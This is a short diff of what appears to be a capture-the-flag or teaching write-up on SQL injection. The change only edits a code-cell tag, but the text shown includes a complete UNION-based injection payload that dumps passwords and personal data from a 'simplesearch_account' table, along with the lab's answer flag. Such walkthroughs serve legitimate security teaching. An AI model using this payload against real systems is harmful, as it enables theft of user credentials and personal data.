@@ -40,9 +40,10 @@ Let's concatenate the columns of 'simplesearch_account' from the columns table o
 
 We are now in the home stretch of our hacking. We will now have to retrieve all the data from this table (i.e., dump the database). The next tweet is the solution.
 
-```{code-cell} sql
+```{code-cell}
 ' OR ''='' UNION SELECT 1000, STRING_AGG(id||'"""'||first_name||'"""'||last_name||'"""'||password||'"""'||birth_date, '|'),'a',DATE('2023-03-01'),'a' FROM simplesearch_account ORDER BY 1 DESC-- 
 ```
+
 Concatenation of columns. Rows separated by | and 3 " for the cols.
 
 And there you have it. Now you can click on the http query to retrieve the result and find the flag of the Admin user 😊: FLAG{Congrats_y0u_pwned_it}.
